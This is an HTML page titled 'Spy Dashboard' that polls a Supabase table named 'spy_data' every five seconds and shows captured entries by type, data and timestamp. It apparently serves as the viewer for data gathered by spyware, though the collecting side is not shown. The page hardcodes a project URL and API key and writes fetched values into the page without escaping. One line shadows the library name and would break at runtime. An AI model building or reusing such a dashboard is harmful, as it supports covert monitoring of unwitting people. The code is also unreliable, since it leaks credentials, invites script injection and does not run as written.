<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Spy Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 800px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h2 {
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ccc;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Spy Dashboard</h2>
        <table id="spyTable">
            <thead>
                <tr>
                    <th>Type</th>
                    <th>Data</th>
                    <th>Timestamp</th>
                </tr>
            </thead>
            <tbody>
                <!-- Data will be inserted here -->
            </tbody>
        </table>
    </div>

    <script>
        // Your Supabase credentials
        const supabaseUrl = 'https://muyevssqiuvhcozgxtlp.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';

        // Initialize Supabase client
        const supabase = supabase.createClient(supabaseUrl, supabaseKey);

        // Fetch and display data
        function fetchData() {
            supabase.from('spy_data').select('*').then((response) => {
                const data = response.data;
                const tableBody = document.querySelector('#spyTable tbody');
                tableBody.innerHTML = ''; // Clear existing data

                data.forEach(item => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${item.type}</td>
                        <td>${item.data}</td>
                        <td>${new Date(item.timestamp).toLocaleString()}</td>
                    `;
                    tableBody.appendChild(row);
                });
            }).catch((error) => {
                console.error('Error fetching data:', error);
            });
        }

        // Refresh data every 5 seconds
        setInterval(fetchData, 5000);
        fetchData(); // Initial load
    </script>
</body>
</html>
